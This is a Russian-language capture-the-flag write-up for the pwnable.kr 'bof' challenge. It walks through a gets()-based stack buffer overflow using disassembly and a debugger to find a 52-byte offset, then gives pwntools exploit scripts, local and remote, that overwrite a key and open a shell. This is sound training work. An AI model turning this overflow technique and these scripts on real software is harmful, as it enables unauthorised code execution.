---
title: "pwn.college - bof(ru)"
date: "2026-06-29"
category: "pwnable.kr"
summary: "bof простая задача на переполнение буфера"
---

# bof

суть задания в том чтобы заменить значение на правильное
посмотрим на код

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                setregid(getegid(), getegid());
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```

здесь используется небезопасная функция `gets`. функция `gets` не безопасная, потому что не сравнивает размер буфера с количеством данных которые мы хотим записать в буфер, что может привести к переполнению буфера. 
для более подробной информации про функцию `gets` обратитесь к одноименной man-странице:
``sh
man gets
``

и так давайте дизассембриуем код чтобы посмотреть где лежит key. воспользуемся программой `objdump`:
```sh
objdump -d -M intel ./bof
```
`-d` -- говорим что мы хотим дизассемблировать все секции
`-M intel` -- говорит что мы хотим чтобы наш дизассемблированный код был написан в синтаксисе intel

давайте посмотрим на функцию `main`:
```asm
0000129d <main>:
    129d:       8d 4c 24 04             lea    ecx,[esp+0x4]
    12a1:       83 e4 f0                and    esp,0xfffffff0
    12a4:       ff 71 fc                push   DWORD PTR [ecx-0x4]
    12a7:       55                      push   ebp
    12a8:       89 e5                   mov    ebp,esp
    12aa:       51                      push   ecx
    12ab:       83 ec 04                sub    esp,0x4
    12ae:       e8 22 00 00 00          call   12d5 <__x86.get_pc_thunk.ax>
    12b3:       05 4d 2d 00 00          add    eax,0x2d4d
    12b8:       83 ec 0c                sub    esp,0xc
    12bb:       68 ef be ad de          push   0xdeadbeef
    12c0:       e8 38 ff ff ff          call   11fd <func>
    12c5:       83 c4 10                add    esp,0x10
    12c8:       b8 00 00 00 00          mov    eax,0x0
    12cd:       8b 4d fc                mov    ecx,DWORD PTR [ebp-0x4]
    12d0:       c9                      leave
    12d1:       8d 61 fc                lea    esp,[ecx-0x4]
    12d4:       c3                      ret
```

и так мы видим что первичное значение пушится на стек, нам нужно заменить его на `0xcafebabe`
для того чтобы перезаписать первичное значние, нам нужно: знать адрес начала нашего буфера и адрес по которому доступно первичное значение, это нужно для того чтобы вычислить количество байт до первичного значения.
для этого мы воспользуемся `pwndbg`
```sh
pwndbg ./bof
```
теперь поставим брейкпоинт на функцию `func` и перейдем в нее
```gdb
b *func
r
```
далее мы делаем переход на вызов функции `gets` и передаем в нее какое то значение чтобы узнать начиная с какого адреса функция кладет данные на стек
![screenshot][https://snipboard.io/NUOfjp.jpg]
мы видим что функция кладет данные на стек начиная с адреса `0xffffc968`, значние которое я нам нужно переписать хранится по адресу `0xffffc9a0`
теперь мы можем посчитать наш оффсет: `0xffffc9a0-0xffffc968-4=52` 
далее нам не составит труда написать эксплойт:
```python
from pwn import *

context.arch = 'i386'

value = p32(0xcafebabe)
payload = b'A'*52+value
p = process('./bof')

p.sendline(payload)
p.interactive()
```

давайте перепишем его так чтобы он применялся к программе запущенной удалено:
```python
from pwn import *

context.arch = 'i386'

value = p32(0xcafebabe)
payload = b'A'*52+value

p = remote('pwnable.kr', port=10003)
p.send(payload)
p.interactive()
```

![screenshot][https://snipboard.io/4RkafG.jpg]
